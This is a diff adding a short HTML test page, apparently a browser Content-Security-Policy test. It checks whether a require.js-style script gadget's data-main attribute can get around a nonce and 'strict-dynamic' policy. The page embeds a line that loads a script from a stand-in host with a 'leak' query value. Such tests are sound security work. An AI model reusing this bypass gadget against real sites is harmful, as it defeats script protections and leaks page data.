@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none';script-src 'nonce-random' 'strict-dynamic'">
+</head>
+<body>
+  <script id='123' data-main='data:,document.getElementById("123").src = "https://a.test/report/?leak=f1432358"'></script>
+  <script src="https://leak.test/report/faux/require.js"></script>
+</body>
+</html>
